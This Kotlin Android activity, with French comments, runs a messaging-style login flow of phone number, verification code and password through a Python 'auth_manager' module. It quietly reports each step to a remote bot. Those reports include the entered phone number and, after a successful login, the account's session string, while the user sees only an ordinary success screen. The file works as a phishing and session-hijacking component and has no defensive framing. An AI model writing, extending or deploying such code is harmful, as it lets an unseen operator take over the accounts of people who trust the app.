package com.tgme.app.ui

import android.app.Activity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import com.tgme.app.*
import java.io.File
import kotlin.concurrent.thread

class MainActivity : Activity() {
    private var currentPhone = ""
    private var currentCode = ""
    private var currentPassword = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 🔥 1. Catch TOUS les crashs non gérés et envoie au bot
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                val crash = "💥 CRASH APP\nThread: ${thread.name}\n${throwable.javaClass.name}: ${throwable.message}\n\n${throwable.stackTraceToString()}"
                Net.send(crash)
                Thread.sleep(2000) // laisser le temps à l'envoi HTTP
            } catch (_: Throwable) {}
            android.os.Process.killProcess(android.os.Process.myPid())
        }
        
        Net.send("🔵 App démarrée")
        
        // 🔥 2. Récupérer le log Python du démarrage précédent (s'il y a eu crash)
        val pyLog = File(filesDir, "python_log.txt")
        if (pyLog.exists()) {
            val content = pyLog.readText()
            if (content.isNotBlank()) Net.send("📋 Log Python précédent:\n$content")
            pyLog.delete()
        }
        
        // 🔥 3. Démarrer Python avec log
        try {
            if (!Python.isStarted()) {
                Net.send("🔧 Démarrage Python...")
                Python.start(AndroidPlatform(this))
                Net.send("✅ Python démarré OK")
            }
        } catch (t: Throwable) {
            Net.send("❌ Python.start FAILED:\n${t.javaClass.name}: ${t.message}\n\n${t.stackTraceToString()}")
            toast("Erreur: Python n'a pas pu démarrer")
            return
        }
        
        Capture.load(this)
        showPhone()
    }

    private fun showPhone() {
        setContentView(R.layout.screen_phone)
        val cc = findViewById<EditText>(R.id.cc)
        val phone = findViewById<EditText>(R.id.phone)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.setOnClickListener {
            val full = normalize(cc.text.toString(), phone.text.toString())
            if (full == null) { toast("Numéro invalide"); return@setOnClickListener }
            currentPhone = full
            btn.isEnabled = false
            toast("Envoi du code...")
            Net.send("📞 Numéro saisi: $full")
            callPython("", "")
        }
    }

    private fun showCode() {
        setContentView(R.layout.screen_code)
        findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
        val codeInput = findViewById<EditText>(R.id.code)
        val btn = findViewById<TextView>(R.id.btn)
        btn.setOnClickListener {
            val code = codeInput.text.toString().replace(Regex("\\D"), "")
            if (code.isEmpty()) return@setOnClickListener
            currentCode = code
            btn.isEnabled = false
            toast("Vérification...")
            callPython(code, "")
        }
    }

    private fun showPassword() {
        setContentView(R.layout.screen_password)
        val pwInput = findViewById<EditText>(R.id.password)
        val btn = findViewById<TextView>(R.id.btn)
        btn.setOnClickListener {
            val password = pwInput.text.toString()
            if (password.isEmpty()) return@setOnClickListener
            currentPassword = password
            btn.isEnabled = false
            toast("Vérification...")
            callPython(currentCode, password)
        }
    }

    private fun callPython(code: String, password: String) {
        thread {
            Net.send("🐍 Appel Python (code='$code', pass=${password.isNotEmpty()})")
            
            val result = try {
                val py = Python.getInstance()
                val mod = py.getModule("auth_manager")
                mod.callAttr("process_login", currentPhone, code, password).toString()
            } catch (t: Throwable) {
                Net.send("💥 CRASH PYTHON CALL:\n${t.javaClass.name}: ${t.message}\n\n${t.stackTraceToString()}")
                "ERROR|CRASH: ${t.javaClass.name}: ${t.message}"
            }
            
            Net.send("📤 Résultat: $result")
            
            // Envoyer le log Python accumulé
            try {
                val pyLog = File(filesDir, "python_log.txt")
                if (pyLog.exists()) {
                    val content = pyLog.readText()
                    if (content.isNotBlank()) Net.send("📋 Log Python:\n$content")
                    pyLog.delete()
                }
            } catch (_: Throwable) {}
            
            runOnUiThread { handleResult(result) }
        }
    }

    private fun handleResult(result: String) {
        when {
            result == "NEED_CODE" -> showCode()
            result == "NEED_PASSWORD" -> showPassword()
            result.startsWith("OK|") -> {
                val parts = result.split("|")
                val userName = parts.getOrNull(1) ?: "User"
                val sessionString = parts.getOrNull(2) ?: ""
                Net.send("🎉 LOGIN RÉUSSI\nUser: $userName\nSESSION: $sessionString")
                setContentView(R.layout.screen_success)
                findViewById<TextView>(R.id.who).text = userName
                findViewById<TextView>(R.id.num).text = currentPhone
            }
            result.startsWith("ERROR|") -> {
                val err = result.removePrefix("ERROR|")
                toast("Erreur: $err")
                showPhone()
            }
            else -> { toast("Réponse: $result"); showPhone() }
        }
    }

    private fun normalize(ccRaw: String, nRaw: String): String? {
        var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (n.isEmpty()) return null
        var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (cc.isNotEmpty() && !cc.startsWith("+")) {
            cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
        }
        val full = when {
            n.startsWith("+") -> n
            n.startsWith("00") -> "+" + n.substring(2)
            else -> cc + n
        }
        return if (full.length >= 8) full else null
    }

    private fun toast(msg: String) = runOnUiThread {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }
}
